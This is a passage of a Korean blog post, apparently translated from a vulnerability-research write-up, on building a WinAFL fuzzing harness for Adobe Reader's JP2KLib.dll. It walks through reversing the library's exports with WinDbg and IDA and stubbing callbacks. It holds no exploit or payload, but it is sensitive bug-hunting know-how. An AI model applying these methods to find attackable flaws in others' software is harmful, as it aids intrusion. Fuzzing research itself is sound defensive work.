&#xB530;&#xB77C;&#xC11C; &#xBCF5;&#xC7A1;&#xD55C; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xAC00; &#xD0C0;&#xAC9F;&#xC77C; &#xB550; &#xB300;&#xAC1C; harness&#xB97C; &#xC791;&#xC131;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><h1 id="What-is-a-Harness"><a href="#What-is-a-Harness" class="headerlink" title="What is a Harness?"></a>What is a Harness?</h1><p>Harness&#xB294; &#xD37C;&#xC9D5; &#xD558;&#xB824;&#xB294; &#xD568;&#xC218;&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xB294; &#xC791;&#xC740; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC785;&#xB2C8;&#xB2E4;. Harness&#xB294; &#xD0C0;&#xAC9F; &#xD568;&#xC218;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xACE0; &#xC788;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC74C;&#xC740; WinAFL &#xB808;&#xD3EC;&#xC5D0; &#xD3EC;&#xD568;&#xB41C; gdiplus&#xC5D0; &#xB300;&#xD55C; &#xAC04;&#xB2E8;&#xD55C; &#xC608;&#xC81C; harness&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/07/04/fabu1ous/50cve/4.png" alt></p><p>main&#xC758; &#xCCAB; argument&#xB294; &#xACBD;&#xB85C;&#xC785;&#xB2C8;&#xB2E4;. &#xD568;&#xC218; &#xB0B4;&#xC5D0;&#xC11C; &#xD37C;&#xC9D5; &#xD558;&#xB824;&#xB294; API&#xC778; Image::Image parser&#xB97C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. &#xC624;&#xB958; &#xBC1C;&#xC0DD; &#xC2DC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC885;&#xB8CC;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xB9C8;&#xC9C0;&#xB9C9;&#xC5D0; &#xBAA8;&#xB4E0; &#xB9AC;&#xC18C;&#xC2A4;&#xB97C; &#xD574;&#xC81C;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; &#xBB38;&#xC11C;&#xD654;&#xB41C; API&#xC5D0;&#xC11C; &#xBE44;&#xAD50;&#xC801; &#xC27D;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBB38;&#xC11C;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xC0D8;&#xD50C; &#xCF54;&#xB4DC;&#xB97C; &#xBCF5;&#xC0AC;&#xD558;&#xAC70;&#xB098; &#xAC04;&#xB2E8;&#xD55C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC791;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xADF8;&#xB7EC;&#xBA74; &#xB108;&#xBB34; &#xC27D;&#xC8E0;?</p><p>Closed Source &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC778; Adobe Reader&#xB97C; &#xD0C0;&#xAC9F;&#xC73C;&#xB85C; &#xC120;&#xD0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0; &#xD0C0;&#xAC9F;&#xC758; Harness &#xC791;&#xC131;&#xBC95;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xD37C;&#xC9D5; &#xD560;&#xB9CC;&#xD55C; &#xD568;&#xC218;&#xB97C; &#xCC3E;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xB9AC;&#xBC84;&#xC2F1;&#xC744; &#xD1B5;&#xD574; &#xBD84;&#xC11D;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xD574;&#xB2F9; API&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC791;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xC798; &#xC791;&#xB3D9;&#xD558;&#xB294; Harness&#xB97C; &#xB9CC;&#xB4E4; &#xB54C;&#xAE4C;&#xC9C0; &#xBC18;&#xBCF5;&#xD569;&#xB2C8;&#xB2E4;.</li></ol><p>&#xB2E4;&#xC74C; &#xC139;&#xC158;&#xC5D0;&#xC11C;&#xB294; JP2KLib.dll&#xC744; &#xB9AC;&#xBC84;&#xC2F1; &#xD558;&#xACE0; &#xC791;&#xB3D9;&#xD558;&#xB294; &#xD558;&#xB2C8;&#xC2A4;&#xB97C; &#xC791;&#xC131;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC744; &#xC790;&#xC138;&#xD788; &#xC124;&#xBA85;&#xD569;&#xB2C8;&#xB2E4;. &#xAC04;&#xB7B5;&#xD55C; &#xBC29;&#xBC95;&#xB860;&#xC5D0;&#xB9CC; &#xAD00;&#xC2EC;&#xC774; &#xC788;&#xB294; &#xB3C5;&#xC790;&#xB4E4;&#xC740; &#xB2E4;&#xC74C; &#xC139;&#xC158;&#xC73C;&#xB85C; &#xAC74;&#xB108;&#xB6F0;&#xC2DC;&#xAE38; &#xBC14;&#xB78D;&#xB2C8;&#xB2E4;.</p><h1 id="Writing-a-Harness-for-JP2KLib-dll"><a href="#Writing-a-Harness-for-JP2KLib-dll" class="headerlink" title="Writing a Harness for JP2KLib.dll"></a>Writing a Harness for JP2KLib.dll</h1><p>JP2KLib.dll&#xC758; &#xB9AC;&#xBC84;&#xC2F1;&#xC744; &#xC2DC;&#xC791;&#xD558;&#xAE30; &#xC804;&#xC5D0;, &#xBA3C;&#xC800; &#xD574;&#xB2F9; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xAC00; &#xC624;&#xD508;&#xC18C;&#xC2A4;&#xC778;&#xC9C0; &#xD639;&#xC740; public &#xC2EC;&#xBCFC;&#xC744; &#xAC16;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xC57C;&#xD569;&#xB2C8;&#xB2E4;. &#xB9CE;&#xC740; &#xC2DC;&#xAC04;&#xC744; &#xC808;&#xC57D;&#xD560; &#xC218; &#xC788;&#xACE0; &#xC0DD;&#xAC01;&#xBCF4;&#xB2E4; &#xD754;&#xD55C; &#xC77C;&#xC774;&#xC9C0;&#xB9CC; &#xC800;&#xD76C;&#xC758; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; &#xC6B4;&#xC774; &#xBCC4;&#xB85C; &#xC88B;&#xC9C0; &#xC54A;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC800;&#xD76C;&#xB294; Adobe Reader&#xAC00; JP2KLib&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xACFC; &#xCD5C;&#xB300;&#xD55C; &#xC720;&#xC0AC;&#xD55C; Harness&#xB97C; &#xC791;&#xC131;&#xD558;&#xACE0; &#xC2F6;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBA3C;&#xC800; &#xC801;&#xC808;&#xD55C; PDF&#xD30C;&#xC77C;&#xC744; &#xCC3E;&#xC544;&#xC57C; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC800;&#xD76C;&#xB294; &#xC81C;&#xD488; &#xD14C;&#xC2A4;&#xD2B8;&#xC6A9; PDF corpus&#xB97C; &#xB9CE;&#xC774; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xC911; JPEG2000&#xC6A9; PDF &#xD544;&#xD130;&#xC778; &#x201C;/JPXdecode&#x201D;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xAC00;&#xC7A5; &#xAC04;&#xB2E8;&#xD55C; &#xC608;&#xC81C;&#xB97C; &#xC0AC;&#xC6A9;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAD6C;&#xAE00;&#xB9C1; &#xB610;&#xB294; Abrocat Pro/Phantom PDF&#xB97C; &#xC0AC;&#xC6A9;&#xD574; testcase&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Pro Tip 1: reader&#xC5D0; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xAC00; &#xC788;&#xC5B4; debugging/triaging&#xC5D0; &#xC131;&#xAC00;&#xC2E0; &#xACBD;&#xC6B0;&#xAC00; &#xC788;&#xC73C;&#xBBC0;&#xB85C; &#xC774; &#xAE30;&#xB2A5;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xC124;&#xC808;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><a href="https://forums.adobe.com/thread/2110951">https://forums.adobe.com/thread/2110951</a></p><p>Pro Tip 2: <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/gflags-and-pageheap">PageHeap</a>&#xC744; &#xC124;&#xC815;&#xD558;&#xC5EC; &#xD560;&#xB2F9; &#xC704;&#xCE58;&#xC640; &#xD06C;&#xAE30;&#xB97C; &#xCD94;&#xC801;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xB9AC;&#xBC84;&#xC2F1; &#xC791;&#xC5C5;&#xC744; &#xC218;&#xC6D4;&#xD558;&#xAC8C; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>PDF wrapper &#xC5C6;&#xC774;&#xB3C4; harness&#xC5D0; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC0D8;&#xD50C; &#xC911;&#xC5D0;&#xC11C; &#xCD94;&#xCD9C;&#xD558;&#xC5EC; jp2 &#xD30C;&#xC77C;&#xC744; &#xCD94;&#xCD9C;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB098;&#xC911;&#xC5D0; harness&#xC758; test input&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xD560; &#xAC83;&#xB4E4;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC791;&#xB3D9;&#xD558;&#xB294; &#xCD5C;&#xC18C; &#xC0D8;&#xD50C;&#xC744; &#xC5BB;&#xC5C8;&#xC73C;&#xB2C8; &#x201C;sxe ld jp2klib&#x201D;&#xC744; &#xC0AC;&#xC6A9;&#xD574; JP2KLib.dll&#xC774; &#xB85C;&#xB4DC;&#xB418;&#xB294; &#xC2DC;&#xC810;&#xC5D0; &#xBE0C;&#xB808;&#xC774;&#xD06C; &#xD3EC;&#xC778;&#xD2B8;&#xB97C; &#xAC78;&#xC5B4;&#xC90D;&#xB2C8;&#xB2E4;. &#xBE0C;&#xB808;&#xC774;&#xD06C; &#xD3EC;&#xC778;&#xD2B8;&#xAC00; &#xAC78;&#xB9AC;&#xBA74; JP2KLib&#xC758; &#xBAA8;&#xB4E0; export &#xD568;&#xC218;&#xC5D0; &#xBE0C;&#xB808;&#xC774;&#xD06C; &#xD3EC;&#xC778;&#xD2B8;&#xB97C; &#xAC78;&#xC5B4; &#xC90D;&#xB2C8;&#xB2E4;. &#xBE0C;&#xB808;&#xC774;&#xD06C; &#xD3EC;&#xC778;&#xD2B8; &#xBA85;&#xB839;&#xC5B4;&#xB294; &#xBAA8;&#xB4E0; call stack, &#xC778;&#xC790;, &#xB9AC;&#xD134; &#xAC12;&#xC744; &#xAE30;&#xB85D;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">bm /a jp2klib!* &#x201C;.<span class="hljs-built_in">echo</span> callstack; k L5; .<span class="hljs-built_in">echo</span> parameters:;  dc esp L8;  .<span class="hljs-built_in">echo</span> <span class="hljs-built_in">return</span> value: ; pt; &#x201D;</code></pre><p>&#xC0D8;&#xD50C; PDF&#xB97C; &#xB85C;&#xB4DC;&#xD574; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; output&#xC744; &#xC5BB;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/07/04/fabu1ous/50cve/5.png" alt></p><p>JP2KLib&#xAC00; &#xB85C;&#xB4DC;&#xB41C; &#xD6C4; &#xCCAB; &#xBC88;&#xC9F8;&#xB85C; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xD568;&#xC218;&#xB294; JP2KLibInitEx&#xC785;&#xB2C8;&#xB2E4;. JP2KLibInitEx&#xAC00; &#xBC1B;&#xB294; &#xC778;&#xC790;&#xB97C; &#xBD84;&#xC11D;&#xD574; &#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/07/04/fabu1ous/50cve/6.png" alt></p><p>AcrobRd32.dll&#xC758; &#xD568;&#xC218;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xD3EC;&#xC778;&#xD2B8;&#xAC00; &#xB2F4;&#xAE34; 0x20 &#xD06C;&#xAE30;&#xC758; &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xC778;&#xC790;&#xB85C; &#xBC1B;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC0C8;&#xB85C;&#xC6B4; &#xD568;&#xC218;&#xC5D0; &#xB3C4;&#xB2EC;&#xD588;&#xB2E4;&#xACE0; &#xBC14;&#xB85C; &#xBD84;&#xC11D;&#xD558;&#xB824;&#xB4E4;&#xBA74; &#xC548;&#xB429;&#xB2C8;&#xB2E4;. &#xADF8; &#xD568;&#xC218;&#xAC00; &#xD0C0;&#xAC9F; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; &#xC4F0;&#xC77C;&#xC9C0; &#xBAA8;&#xB974;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;. &#xC6B0;&#xC120; &#x201C;nopX&#x201D;(X&#xB294; &#xC22B;&#xC790;)&#xB77C;&#xB294; &#xC774;&#xB984;&#xC73C;&#xB85C; &#xBE48; &#xD568;&#xC218; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xAD6C;&#xC870;&#xCCB4;&#xC5D0; &#xB123;&#xC5B4;&#xB193;&#xACE0; Harness&#xC758; &#xBF08;&#xB300;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4; &#xBD05;&#xC2DC;&#xB2E4;.</p><ol><li>Command line argument&#xB85C;&#xBD80;&#xD130; input file&#xC744; &#xBC1B;&#xB294;&#xB2E4;.</li><li>JP2KLib.dll&#xC744; &#xB85C;&#xB4DC;&#xD55C;&#xB2E4;.</li><li>&#xB9CC;&#xB4E4;&#xC5B4;&#xB454; &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xC778;&#xC790;&#xB85C; JP2KLibInitEx&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</li></ol><p><img src="/2021/07/04/fabu1ous/50cve/7.png" alt></p><p>LOAD_FUNC&#xB294; &#xC800;&#xD76C;&#xAC00; &#xC791;&#xC131;&#xD55C; &#xB9E4;&#xD06C;&#xB85C;&#xC785;&#xB2C8;&#xB2E4;. nopX &#xD568;&#xC218;&#xB97C; &#xC124;&#xC815;&#xD558;&#xB294; NOP&#xB9E4;&#xD06C;&#xB85C;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/07/04/fabu1ous/50cve/8.png" alt></p><p>&#xCEF4;&#xD30C;&#xC77C;&#xD558;&#xACE0; sample.jp2&#xC640; &#xD568;&#xAED8; &#xC2E4;&#xD589;&#xD574;&#xBCF4;&#xBA74; &#xC798; &#xC791;&#xB3D9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#x201C;g&#x201D;&#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD1B5;&#xD574; &#xB2E4;&#xC74C; &#xD568;&#xC218;&#xB85C; &#xB118;&#xC5B4;&#xAC00; &#xBD05;&#xC2DC;&#xB2E4;. &#xB2E4;&#xC74C;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xD568;&#xC218;&#xB294; JP2KGetMemObjEx&#xC774;&#xACE0; &#xC5B4;&#xB5A0;&#xD55C; &#xC778;&#xC790;&#xB3C4; &#xBC1B;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xD638;&#xCD9C;&#xD558;&#xACE0; &#xB9AC;&#xD134; &#xAC12;&#xB9CC; &#xC800;&#xC7A5;&#xD569;&#xC2DC;&#xB2E4;.</p><p>&#xADF8;&#xB2E4;&#xC74C; &#xD568;&#xC218;&#xC778; JP2KDecOptCreat &#xB610;&#xD55C; &#xC778;&#xC790;&#xB97C; &#xBC1B;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xB85C; &#xD638;&#xCD9C;&#xD558;&#xACE0; &#xB9AC;&#xD134; &#xAC12;&#xB9CC; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C; &#xBB38;&#xC81C;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. JP2KDecOptCreat &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; nop4&#xC640; nop7 &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294;&#xAD70;&#xC694;. &#xB530;&#xB77C;&#xC11C; &#xAC01;&#xAC01; &#xAD6C;&#xD604;&#xC744; &#xD574;&#xC918;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xC81C; nop4&#xAC00; &#xC5B4;&#xB5A4; &#xB3D9;&#xC791;&#xC744; &#xD558;&#xB294;&#xC9C0; &#xC54C;&#xC544;&#xB0B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. nop4&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xC2E4;&#xC81C; &#xD568;&#xC218; AcroRd32!CTJPEGDecoderRelease+0xa992 &#xC5D0; &#xBE0C;&#xB808;&#xC774;&#xD06C; &#xD3EC;&#xC778;&#xD2B8;&#xB97C; &#xAC78;&#xC5B4;&#xC90D;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/07/04/fabu1ous/50cve/9.png" alt></p><p>&#xADF8;&#xB9AC;&#xACE0; &#xACC4;&#xC18D; &#xC2E4;&#xD589;&#xD558;&#xB2E4;&#xBCF4;&#xBA74;</p><p><img src="/2021/07/04/fabu1ous/50cve/10.png" alt></p><p>&#xC774;&#xACF3;&#xC5D0; &#xB3C4;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/07/04/fabu1ous/50cve/11.png" alt></p><p>&#xC989;, nop4&#xB294; malloc&#xC758; wrapper&#xD568;&#xC218;&#xC785;&#xB2C8;&#xB2E4;. &#xC800;&#xD76C;&#xAC00; &#xC9C1;&#xC811; &#xAD6C;&#xD604;&#xD55C; &#xB4A4; nop4&#xC640; &#xBC14;&#xAFD4;&#xC90D;&#xB2C8;&#xB2E4;. nop7(memset), nop5(free), nop6(memcpy)&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB3C4; &#xB3D9;&#xC77C;&#xD55C; &#xC791;&#xC5C5;&#xC744; &#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB2E4;&#xC74C; &#xD568;&#xC218;&#xC778; JP2KDecOptInitToDefaults &#xC778;&#xC790;&#xB97C; &#xBC1B;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD638;&#xCD9C;&#xD558;&#xACE0; &#xB9AC;&#xD134; &#xAC12;&#xC744; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD604;&#xC7AC; harness&#xC758; &#xBAA8;&#xC2B5;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/07/04/fabu1ous/50cve/12.png" alt></p><p>&#xB2E4;&#xC74C; &#xD568;&#xC218;&#xC778; JP2KImageInitDecoderEx&#xB294; 5&#xAC1C;&#xC758; &#xC778;&#xC790;&#xB97C; &#xBC1B;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>5&#xAC1C;&#xC758; &#xC778;&#xC790; &#xC911; 3&#xAC1C;&#xB294; JP2KImageCreate, JP2KDecOptCreate, JP2KGetMemObjEx&#xC758; &#xB9AC;&#xD134; &#xAC12;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC138; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xB294; vtable&#xC744; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xD3EC;&#xC778;&#xD130;&#xC785;&#xB2C8;&#xB2E4;. &#xC9C0;&#xAE08;&#xAE4C;&#xC9C0; &#xC0AC;&#xC6A9;&#xD55C; &#xD2B8;&#xB9AD;&#xC744; &#xB611;&#xAC19;&#xC774; &#xBC18;&#xBCF5;&#xD569;&#xB2C8;&#xB2E4;. nop&#xC744; &#xB2F4;&#xACE0; &#xC788;&#xB294; &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xC778;&#xC790;&#xB85C; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB450; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xB294; &#xAD6C;&#xC870;&#xCCB4;&#xC785;&#xB2C8;&#xB2E4;. &#xD568;&#xC218; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xB2F4;&#xACE0; &#xC788;&#xC9C0; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC0C1;&#xC218;&#xAC12; 0xbaaddaab&#xB97C; &#xBCF4;&#xB0B4;&#xC90D;&#xB2C8;&#xB2E4;.</p><p>&#xD604;&#xC7AC; harness&#xC758; &#xBAA8;&#xC2B5;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/07/04/fabu1ous/50cve/13.png" alt></p><p>harness&#xB97C; &#xC2E4;&#xD589;&#xD574;&#xBCF4;&#xB2C8; nop10&#xC73C;&#xB85C; &#xB3C4;&#xB2EC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. nop10&#xC758; &#xC2E4;&#xC81C; &#xD568;&#xC218;&#xC5D0; &#xBE0C;&#xB808;&#xC774;&#xD06C; &#xD3EC;&#xC778;&#xD2B8;&#xB97C; &#xAC78;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; call stack&#xC744; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/07/04/fabu1ous/50cve/14.png" alt></p><p>JP2KCodeStm::IsSeekable&#xB97C; IDA&#xB85C; &#xC0B4;&#xD3B4;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/07/04/fabu1ous/50cve/15.png" alt></p><p>JP2KCodeStm&#xC758; 0x24 &#xC624;&#xD504;&#xC14B;&#xC5D0; &#xC774;&#xC804; &#xB2E8;&#xACC4;&#xC5D0; &#xB123;&#xC5B4;&#xC900; vtable&#xC774;, 0x18 &#xC624;&#xD504;&#xC14B;&#xC5D0; 0xbaaddaab &#xC0C1;&#xC218;&#xAC12;&#xC774; &#xC788;&#xB294; &#xAC83;&#xC744; Windbg&#xB85C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. JP2KCodeStm::IsSeekable&#xC740; 0xbaaddaab&#xB97C; &#xC778;&#xC790;&#xB85C; vtable&#xC5D0; &#xC788;&#xB294; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xAC01; &#xD30C;&#xC11C;&#xB9C8;&#xB2E4; &#xB2E4;&#xB974;&#xACA0;&#xC9C0;&#xB9CC; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xC775;&#xC219;&#xD55C; &#xD30C;&#xC77C; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;(FILE/ifstream)&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; input stream&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC77C;&#xC885;&#xC758; input stream(network/file/memory) &#xCD94;&#xC0C1;&#xD654;&#xC785;&#xB2C8;&#xB2E4;. &#xC800;&#xD76C;&#xB294; JP2KCodeStm&#xC758; &#xB3D9;&#xC791;&#xC744; &#xBCF4;&#xACE0; &#xBC14;&#xB85C; &#xC54C;&#xC544;&#xCC28;&#xB838;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>0xbaaddaab&#xB294; &#xC2A4;&#xD2B8;&#xB9BC; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xC774;&#xACE0; vtable&#xC740; &#xADF8; &#xC2A4;&#xD2B8;&#xB9BC; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xC5D0; &#xB300;&#xD55C; &#xD568;&#xC218;&#xB4E4;&#xC785;&#xB2C8;&#xB2E4;. IDA&#xB85C; &#xB3CC;&#xC544;&#xAC00; JP2KCodeStm::XXX &#xD568;&#xC218;&#xB4E4;&#xC744; &#xD655;&#xC778;&#xD574; &#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/07/04/fabu1ous/50cve/16.png" alt></p><p>&#xB300;&#xBD80;&#xBD84; &#xC720;&#xC0AC;&#xD55C; &#xBC29;&#xC2DD;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC9C1;&#xC811; &#xD30C;&#xC77C; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; &#xB9CC;&#xB4E4;&#xACE0; &#xD544;&#xC694;&#xD55C; &#xBA54;&#xC18C;&#xB4DC;&#xB97C; &#xAD6C;&#xD604;&#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/07/04/fabu1ous/50cve/17.png" alt></p><p>&#xC624;&#xB958;&#xAC00; &#xB098;&#xBA74; &#xBC84;&#xB9AC;&#xACE0; &#xC544;&#xB2C8;&#xB77C;&#xBA74; JP2KImageInitDecoderEx&#xC758; &#xB9AC;&#xD134; &#xAC12;&#xC744; &#xAC80;&#xC0AC;&#xD558;&#xB3C4;&#xB85D; &#xB9CC;&#xB4E4;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. JP2KImageInitDecoderEx&#xC740; &#xC131;&#xACF5; &#xC2DC; 0&#xC744; &#xB9AC;&#xD134;&#xD569;&#xB2C8;&#xB2E4;. &#xC2A4;&#xD2B8;&#xB9BC; &#xD568;&#xC218;&#xB97C; &#xAD6C;&#xD604;&#xD558;&#xB294;&#xB370; &#xBA87; &#xBC88;&#xC758; &#xC2DC;&#xD589;&#xCC29;&#xC624;&#xAC00; &#xC788;&#xC5C8;&#xC9C0;&#xB9CC; &#xC6D0;&#xD558;&#xB358; &#xB9AC;&#xD134; &#xAC12;&#xC744; &#xC5BB;&#xB294; &#xB370; &#xC131;&#xACF5;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xC74C; &#xD568;&#xC218;&#xC778; JP2KImageDataCreate&#xB294; &#xC778;&#xC790;&#xB97C; &#xBC1B;&#xC9C0; &#xC54A;&#xC73C;&#xBA70; &#xB9AC;&#xD134; &#xAC12;&#xC744; &#xADF8;&#xB2E4;&#xC74C; &#xD568;&#xC218;&#xC778; JP2KImageGetMaxRes&#xC5D0; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;. &#xD638;&#xCD9C;&#xD558;&#xACE0; &#xB118;&#xC5B4;&#xAC11;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xC74C;&#xC740; 7&#xAC1C;&#xC758; &#xC778;&#xC790;&#xB97C; &#xBC1B;&#xB294; JP2KImageDecodeTileInterleaved &#xD568;&#xC218;&#xC785;&#xB2C8;&#xB2E4;. 7&#xAC1C;&#xC758; &#xC778;&#xC790; &#xC911; 3&#xAC1C;&#xB294; JP2KImageCreate, JP2KImageGetMaxRes, JP2KImageDataCreate&#xC758; &#xB9AC;&#xD134; &#xAC12;&#xC785;&#xB2C8;&#xB2E4;.</p><p>IDA&#xB85C; &#xD655;&#xC778;&#xD574;&#xBCF8; &#xACB0;&#xACFC; &#xB450; &#xBC88;&#xC9F8; &#xADF8;&#xB9AC;&#xACE0; 6&#xBC88;&#xC9F8; &#xC778;&#xC790;&#xB294; NULL&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xB124; &#xBC88;&#xC9F8;, &#xB2E4;&#xC12F; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xB294; color depth&#xC640; &#xAD00;&#xB828;&#xB41C; &#xC778;&#xC790;&#xB85C; &#xC800;&#xD76C;&#xB294; &#xC774; &#xB450; &#xAC12;&#xC774; &#xACE0;&#xC815;&#xB41C; &#xCCB4;&#xB85C; &#xD37C;&#xC9D5;&#xC744; &#xD558;&#xAE30;&#xB85C; 